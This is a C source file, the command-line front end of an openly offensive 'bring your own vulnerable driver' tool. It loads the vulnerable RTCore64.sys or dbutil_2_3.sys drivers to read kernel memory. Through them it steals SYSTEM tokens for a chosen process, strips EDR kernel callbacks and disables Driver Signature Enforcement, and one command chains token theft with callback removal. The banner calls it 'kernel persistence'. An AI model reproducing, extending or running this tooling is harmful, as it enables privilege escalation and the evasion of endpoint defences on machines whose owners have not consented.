/*
 * byovd_main.c — CHEYANNE BYOVD CLI
 * 22DIV / george wu
 *
 * Usage:
 *   byovd.exe <driver.sys> [command] [args]
 *
 * Commands:
 *   token <PID>     — steal SYSTEM token for process
 *   callbacks       — remove EDR kernel callbacks
 *   dse             — disable Driver Signature Enforcement
 *   walk            — dump EPROCESS list (PID + image name)
 *   read <addr>     — read 8 bytes from kernel address
 *   all <PID>       — full chain: token + callbacks
 */

#include "byovd.h"
#include <stdio.h>
#include <stdlib.h>

static void usage(void)
{
    printf("\n");
    printf("  CHEYANNE BYOVD — Kernel Persistence\n");
    printf("  =================================\n");
    printf("\n");
    printf("  Usage: byovd.exe <driver.sys> <command> [args]\n");
    printf("\n");
    printf("  Commands:\n");
    printf("    token <PID>     Steal SYSTEM token\n");
    printf("    callbacks       Remove EDR kernel callbacks\n");
    printf("    dse             Disable DSE (restore on exit)\n");
    printf("    walk            Dump EPROCESS list\n");
    printf("    read <addr>     Read 8 bytes at kernel address\n");
    printf("    all <PID>       Full chain: token + callbacks\n");
    printf("\n");
    printf("  Drivers:\n");
    printf("    RTCore64.sys    MSI Afterburner (CVE-2019-16098)\n");
    printf("    dbutil_2_3.sys  Dell BIOS Utility (CVE-2021-21551)\n");
    printf("\n");
}

static BYOVD_DRIVER detect_driver(const char *path)
{
    const char *name = strrchr(path, '\\');
    if (!name) name = strrchr(path, '/');
    if (name) name++; else name = path;

    if (_stricmp(name, "RTCore64.sys") == 0) return DRIVER_RTCORE64;
    if (_stricmp(name, "dbutil_2_3.sys") == 0) return DRIVER_DBUTIL23;

    printf("  [!] Unknown driver: %s\n", name);
    printf("      Supported: RTCore64.sys, dbutil_2_3.sys\n");
    return (BYOVD_DRIVER)-1;
}

static void cmd_walk(BYOVD_CTX *ctx)
{
    if (!kernel_find_system_eprocess(ctx)) return;

    ULONGLONG head = ctx->eprocess_system + EPROCESS_ACTIVE_LINKS;
    ULONGLONG current_link;

    if (!kread64(ctx, head, &current_link)) return;

    printf("\n  %-8s %-18s %s\n", "PID", "EPROCESS", "IMAGE");
    printf("  %-8s %-18s %s\n", "---", "--------", "-----");

    DWORD pid4;
    char name4[16] = {0};
    kread32(ctx, ctx->eprocess_system + EPROCESS_UNIQUE_PID, &pid4);
    kread_buf(ctx, ctx->eprocess_system + EPROCESS_IMAGE_FILENAME, name4, 15);
    printf("  %-8u 0x%016llX %s\n", pid4, ctx->eprocess_system, name4);

    int walked = 0;
    while (current_link != head && walked < 4096) {
        ULONGLONG eprocess = current_link - EPROCESS_ACTIVE_LINKS;
        DWORD pid;
        char name[16] = {0};

        if (!kread32(ctx, eprocess + EPROCESS_UNIQUE_PID, &pid)) break;
        kread_buf(ctx, eprocess + EPROCESS_IMAGE_FILENAME, name, 15);

        printf("  %-8u 0x%016llX %s\n", pid, eprocess, name);

        if (!kread64(ctx, current_link, &current_link)) break;
        walked++;
    }

    printf("\n  [*] %d processes enumerated\n", walked + 1);
}

static void cmd_read(BYOVD_CTX *ctx, const char *addr_str)
{
    ULONGLONG addr = strtoull(addr_str, NULL, 16);
    if (!addr) {
        printf("  [!] Invalid address: %s\n", addr_str);
        return;
    }

    ULONGLONG val;
    if (kread64(ctx, addr, &val)) {
        printf("  [+] [0x%llX] = 0x%llX\n", addr, val);
    } else {
        printf("  [!] Read failed at 0x%llX\n", addr);
    }
}

int main(int argc, char *argv[])
{
    printf("\n");
    printf("  ██████╗ ██╗   ██╗ ██████╗ ██╗   ██╗██████╗\n");
    printf("  ██╔══██╗╚██╗ ██╔╝██╔═══██╗██║   ██║██╔══██╗\n");
    printf("  ██████╔╝ ╚████╔╝ ██║   ██║██║   ██║██║  ██║\n");
    printf("  ██╔══██╗  ╚██╔╝  ██║   ██║╚██╗ ██╔╝██║  ██║\n");
    printf("  ██████╔╝   ██║   ╚██████╔╝ ╚████╔╝ ██████╔╝\n");
    printf("  ╚═════╝    ╚═╝    ╚═════╝   ╚═══╝  ╚═════╝\n");
    printf("  22DIV // george wu // kernel persistence\n\n");

    if (argc < 3) {
        usage();
        return 1;
    }

    BYOVD_DRIVER drv = detect_driver(argv[1]);
    if ((int)drv < 0) return 1;

    wchar_t driver_path[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, driver_path, MAX_PATH);

    BYOVD_CTX ctx;
    byovd_init(&ctx, drv, driver_path);

    printf("  [*] Loading driver...\n");
    if (!byovd_load_driver(&ctx)) {
        return 1;
    }

    if (!byovd_open_device(&ctx)) {
        byovd_unload(&ctx);
        return 1;
    }

    if (!kernel_find_ntoskrnl(&ctx)) {
        byovd_unload(&ctx);
        return 1;
    }

    const char *cmd = argv[2];

    if (_stricmp(cmd, "token") == 0) {
        if (argc < 4) {
            printf("  [!] Usage: byovd.exe <driver> token <PID>\n");
        } else {
            DWORD pid = (DWORD)atoi(argv[3]);
            kernel_steal_token(&ctx, pid);
        }
    }
    else if (_stricmp(cmd, "callbacks") == 0) {
        kernel_remove_callbacks(&ctx);
    }
    else if (_stricmp(cmd, "dse") == 0) {
        if (kernel_dse_disable(&ctx)) {
            printf("  [*] Press ENTER to restore DSE...\n");
            getchar();
            kernel_dse_restore(&ctx);
        }
    }
    else if (_stricmp(cmd, "walk") == 0) {
        cmd_walk(&ctx);
    }
    else if (_stricmp(cmd, "read") == 0) {
        if (argc < 4) {
            printf("  [!] Usage: byovd.exe <driver> read <hex_addr>\n");
        } else {
            cmd_read(&ctx, argv[3]);
        }
    }
    else if (_stricmp(cmd, "all") == 0) {
        if (argc < 4) {
            printf("  [!] Usage: byovd.exe <driver> all <PID>\n");
        } else {
            DWORD pid = (DWORD)atoi(argv[3]);
            printf("\n  === PHASE 1: Token Theft ===\n\n");
            kernel_steal_token(&ctx, pid);
            printf("\n  === PHASE 2: Callback Removal ===\n\n");
            kernel_remove_callbacks(&ctx);
            printf("\n  === CHAIN COMPLETE ===\n\n");
        }
    }
    else {
        printf("  [!] Unknown command: %s\n", cmd);
        usage();
    }

    printf("\n  [*] Unloading driver...\n");
    byovd_unload(&ctx);
    printf("  [*] Done.\n\n");
    return 0;
}
